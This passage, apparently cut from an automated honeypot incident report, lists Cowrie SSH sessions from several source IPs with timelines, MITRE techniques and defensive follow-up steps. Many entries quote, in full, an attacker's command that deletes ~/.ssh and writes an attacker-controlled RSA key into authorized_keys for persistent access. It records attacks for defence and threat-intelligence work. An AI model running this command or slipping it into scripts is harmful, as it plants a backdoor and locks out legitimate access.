| `2026-04-14 03:12:19` | `cowrie.log.closed` |
| `2026-04-14 03:12:19` | `cowrie.session.params` |
| `2026-04-14 03:12:19` | `cowrie.command.input` |
| `2026-04-14 03:12:19` | `cowrie.log.closed` |
| `2026-04-14 03:12:20` | `cowrie.session.params` |
| `2026-04-14 03:12:20` | `cowrie.command.input` |
| `2026-04-14 03:12:20` | `cowrie.command.input` |
| `2026-04-14 03:12:20` | `cowrie.log.closed` |
| `2026-04-14 03:12:21` | `cowrie.session.params` |
| `2026-04-14 03:12:21` | `cowrie.command.input` |
| `2026-04-14 03:12:21` | `cowrie.log.closed` |
| `2026-04-14 03:12:21` | `cowrie.session.params` |
| `2026-04-14 03:12:21` | `cowrie.command.input` |
| `2026-04-14 03:12:22` | `cowrie.log.closed` |
| `2026-04-14 03:12:22` | `cowrie.session.params` |
| `2026-04-14 03:12:22` | `cowrie.command.input` |
| `2026-04-14 03:12:22` | `cowrie.log.closed` |
| `2026-04-14 03:12:23` | `cowrie.session.params` |
| `2026-04-14 03:12:23` | `cowrie.command.input` |
| `2026-04-14 03:12:23` | `cowrie.log.closed` |
| `2026-04-14 03:12:24` | `cowrie.session.params` |
| `2026-04-14 03:12:24` | `cowrie.command.input` |
| `2026-04-14 03:12:24` | `cowrie.log.closed` |
| `2026-04-14 03:12:24` | `cowrie.session.params` |
| `2026-04-14 03:12:24` | `cowrie.command.input` |
| `2026-04-14 03:12:25` | `cowrie.log.closed` |
| `2026-04-14 03:12:25` | `cowrie.session.params` |
| `2026-04-14 03:12:25` | `cowrie.command.input` |
| `2026-04-14 03:12:25` | `cowrie.log.closed` |
| `2026-04-14 03:12:26` | `cowrie.session.params` |
| `2026-04-14 03:12:26` | `cowrie.command.input` |
| `2026-04-14 03:12:26` | `cowrie.log.closed` |
| `2026-04-14 03:12:26` | `cowrie.session.params` |
| `2026-04-14 03:12:26` | `cowrie.command.input` |
| `2026-04-14 03:12:26` | `cowrie.log.closed` |
| `2026-04-14 03:12:27` | `cowrie.session.params` |
| `2026-04-14 03:12:27` | `cowrie.command.input` |
| `2026-04-14 03:12:27` | `cowrie.log.closed` |
| `2026-04-14 03:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.227.152[.]250` to AbuseIPDB if not already reported
- [ ] Block `121.227.152[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8edd0280855

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:13 |
| **Last Seen** | 2026-04-14 03:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:13:11` | `cowrie.session.connect` |
| `2026-04-14 03:13:11` | `cowrie.client.version` |
| `2026-04-14 03:13:11` | `cowrie.client.kex` |
| `2026-04-14 03:13:13` | `cowrie.login.success` |
| `2026-04-14 03:13:14` | `cowrie.session.params` |
| `2026-04-14 03:13:14` | `cowrie.command.input` |
| `2026-04-14 03:13:14` | `cowrie.command.failed` |
| `2026-04-14 03:13:15` | `cowrie.log.closed` |
| `2026-04-14 03:13:16` | `cowrie.session.params` |
| `2026-04-14 03:13:16` | `cowrie.command.input` |
| `2026-04-14 03:13:16` | `cowrie.session.file_download` |
| `2026-04-14 03:13:16` | `cowrie.log.closed` |
| `2026-04-14 03:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278846205a0d

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:13 |
| **Last Seen** | 2026-04-14 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:13:19` | `cowrie.session.connect` |
| `2026-04-14 03:13:19` | `cowrie.client.version` |
| `2026-04-14 03:13:20` | `cowrie.client.kex` |
| `2026-04-14 03:13:21` | `cowrie.login.success` |
| `2026-04-14 03:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5501007f6852

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:14 |
| **Last Seen** | 2026-04-14 03:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:14:45` | `cowrie.session.connect` |
| `2026-04-14 03:14:45` | `cowrie.client.version` |
| `2026-04-14 03:14:46` | `cowrie.client.kex` |
| `2026-04-14 03:14:47` | `cowrie.login.success` |
| `2026-04-14 03:14:47` | `cowrie.session.params` |
| `2026-04-14 03:14:47` | `cowrie.command.input` |
| `2026-04-14 03:14:47` | `cowrie.command.failed` |
| `2026-04-14 03:14:48` | `cowrie.log.closed` |
| `2026-04-14 03:14:48` | `cowrie.session.params` |
| `2026-04-14 03:14:48` | `cowrie.command.input` |
| `2026-04-14 03:14:49` | `cowrie.session.file_download` |
| `2026-04-14 03:14:49` | `cowrie.log.closed` |
| `2026-04-14 03:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a245904909fd

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:14 |
| **Last Seen** | 2026-04-14 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:14:52` | `cowrie.session.connect` |
| `2026-04-14 03:14:52` | `cowrie.client.version` |
| `2026-04-14 03:14:52` | `cowrie.client.kex` |
| `2026-04-14 03:14:54` | `cowrie.login.success` |
| `2026-04-14 03:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0e061f7550

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:17 |
| **Last Seen** | 2026-04-14 03:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:17:53` | `cowrie.session.connect` |
| `2026-04-14 03:17:53` | `cowrie.client.version` |
| `2026-04-14 03:17:53` | `cowrie.client.kex` |
| `2026-04-14 03:17:54` | `cowrie.login.success` |
| `2026-04-14 03:17:55` | `cowrie.session.params` |
| `2026-04-14 03:17:55` | `cowrie.command.input` |
| `2026-04-14 03:17:55` | `cowrie.command.failed` |
| `2026-04-14 03:17:55` | `cowrie.log.closed` |
| `2026-04-14 03:17:56` | `cowrie.session.params` |
| `2026-04-14 03:17:56` | `cowrie.command.input` |
| `2026-04-14 03:17:56` | `cowrie.session.file_download` |
| `2026-04-14 03:17:56` | `cowrie.log.closed` |
| `2026-04-14 03:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c984a271684

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:18 |
| **Last Seen** | 2026-04-14 03:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:18:00` | `cowrie.session.connect` |
| `2026-04-14 03:18:00` | `cowrie.client.version` |
| `2026-04-14 03:18:00` | `cowrie.client.kex` |
| `2026-04-14 03:18:01` | `cowrie.login.success` |
| `2026-04-14 03:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70cfede03d64

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:22 |
| **Last Seen** | 2026-04-14 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:22:21` | `cowrie.session.connect` |
| `2026-04-14 03:22:21` | `cowrie.client.version` |
| `2026-04-14 03:22:22` | `cowrie.client.kex` |
| `2026-04-14 03:22:23` | `cowrie.login.success` |
| `2026-04-14 03:22:23` | `cowrie.session.params` |
| `2026-04-14 03:22:23` | `cowrie.command.input` |
| `2026-04-14 03:22:23` | `cowrie.command.failed` |
| `2026-04-14 03:22:24` | `cowrie.log.closed` |
| `2026-04-14 03:22:24` | `cowrie.session.params` |
| `2026-04-14 03:22:24` | `cowrie.command.input` |
| `2026-04-14 03:22:25` | `cowrie.session.file_download` |
| `2026-04-14 03:22:25` | `cowrie.log.closed` |
| `2026-04-14 03:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9c07b01e78

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:22 |
| **Last Seen** | 2026-04-14 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:22:28` | `cowrie.session.connect` |
| `2026-04-14 03:22:28` | `cowrie.client.version` |
| `2026-04-14 03:22:28` | `cowrie.client.kex` |
| `2026-04-14 03:22:30` | `cowrie.login.success` |
| `2026-04-14 03:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387f68ff681c

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:29 |
| **Last Seen** | 2026-04-14 03:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:29:51` | `cowrie.session.connect` |
| `2026-04-14 03:29:51` | `cowrie.client.version` |
| `2026-04-14 03:29:51` | `cowrie.client.kex` |
| `2026-04-14 03:29:52` | `cowrie.login.success` |
| `2026-04-14 03:29:53` | `cowrie.session.params` |
| `2026-04-14 03:29:53` | `cowrie.command.input` |
| `2026-04-14 03:29:53` | `cowrie.command.failed` |
| `2026-04-14 03:29:53` | `cowrie.log.closed` |
| `2026-04-14 03:29:54` | `cowrie.session.params` |
| `2026-04-14 03:29:54` | `cowrie.command.input` |
| `2026-04-14 03:29:54` | `cowrie.session.file_download` |
| `2026-04-14 03:29:54` | `cowrie.log.closed` |
| `2026-04-14 03:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad0598166106

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:29 |
| **Last Seen** | 2026-04-14 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:29:58` | `cowrie.session.connect` |
| `2026-04-14 03:29:58` | `cowrie.client.version` |
| `2026-04-14 03:29:58` | `cowrie.client.kex` |
| `2026-04-14 03:30:00` | `cowrie.login.success` |
| `2026-04-14 03:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6373fc87e4c

| Field | Detail |
|---|---|
| **Source IP** | `222.73.134[.]254` |
| **First Seen** | 2026-04-14 03:45 |
| **Last Seen** | 2026-04-14 03:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:45:42` | `cowrie.session.connect` |
| `2026-04-14 03:45:43` | `cowrie.client.version` |
| `2026-04-14 03:45:43` | `cowrie.client.kex` |
| `2026-04-14 03:45:49` | `cowrie.login.success` |
| `2026-04-14 03:45:50` | `cowrie.session.params` |
| `2026-04-14 03:45:50` | `cowrie.command.input` |
| `2026-04-14 03:45:51` | `cowrie.log.closed` |
| `2026-04-14 03:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.73.134[.]254` to AbuseIPDB if not already reported
- [ ] Block `222.73.134[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2940d22133

| Field | Detail |
|---|---|
| **Source IP** | `103.107.60[.]45` |
| **First Seen** | 2026-04-14 04:12 |
| **Last Seen** | 2026-04-14 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:12:00` | `cowrie.session.connect` |
| `2026-04-14 04:12:00` | `cowrie.client.version` |
| `2026-04-14 04:12:00` | `cowrie.client.kex` |
| `2026-04-14 04:12:00` | `cowrie.login.success` |
| `2026-04-14 04:12:00` | `cowrie.session.params` |
| `2026-04-14 04:12:00` | `cowrie.command.input` |
| `2026-04-14 04:12:00` | `cowrie.command.failed` |
| `2026-04-14 04:12:00` | `cowrie.log.closed` |
| `2026-04-14 04:12:00` | `cowrie.session.params` |
| `2026-04-14 04:12:00` | `cowrie.command.input` |
| `2026-04-14 04:12:00` | `cowrie.session.file_download` |
| `2026-04-14 04:12:00` | `cowrie.log.closed` |
| `2026-04-14 04:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.107.60[.]45` to AbuseIPDB if not already reported
- [ ] Block `103.107.60[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eecd10004cf8

| Field | Detail |
|---|---|
| **Source IP** | `103.107.60[.]45` |
| **First Seen** | 2026-04-14 04:12 |
| **Last Seen** | 2026-04-14 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:12:01` | `cowrie.session.connect` |
| `2026-04-14 04:12:01` | `cowrie.client.version` |
| `2026-04-14 04:12:01` | `cowrie.client.kex` |
| `2026-04-14 04:12:01` | `cowrie.login.success` |
| `2026-04-14 04:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.107.60[.]45` to AbuseIPDB if not already reported
- [ ] Block `103.107.60[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b59a221ab3e

| Field | Detail |
|---|---|
| **Source IP** | `131.161.249[.]165` |
| **First Seen** | 2026-04-14 04:12 |
| **Last Seen** | 2026-04-14 04:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:12:39` | `cowrie.session.connect` |
| `2026-04-14 04:12:39` | `cowrie.client.version` |
| `2026-04-14 04:12:39` | `cowrie.client.kex` |
| `2026-04-14 04:12:41` | `cowrie.login.success` |
| `2026-04-14 04:12:41` | `cowrie.session.params` |
| `2026-04-14 04:12:41` | `cowrie.command.input` |
| `2026-04-14 04:12:41` | `cowrie.command.failed` |
| `2026-04-14 04:12:42` | `cowrie.log.closed` |
| `2026-04-14 04:12:43` | `cowrie.session.params` |
| `2026-04-14 04:12:43` | `cowrie.command.input` |
| `2026-04-14 04:12:43` | `cowrie.session.file_download` |
| `2026-04-14 04:12:43` | `cowrie.log.closed` |
| `2026-04-14 04:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `131.161.249[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5580d47bd821

| Field | Detail |
|---|---|
| **Source IP** | `131.161.249[.]165` |
| **First Seen** | 2026-04-14 04:12 |
| **Last Seen** | 2026-04-14 04:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:12:47` | `cowrie.session.connect` |
| `2026-04-14 04:12:47` | `cowrie.client.version` |
| `2026-04-14 04:12:47` | `cowrie.client.kex` |
| `2026-04-14 04:12:48` | `cowrie.login.success` |
| `2026-04-14 04:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `131.161.249[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2e581be438

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:18 |
| **Last Seen** | 2026-04-14 04:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

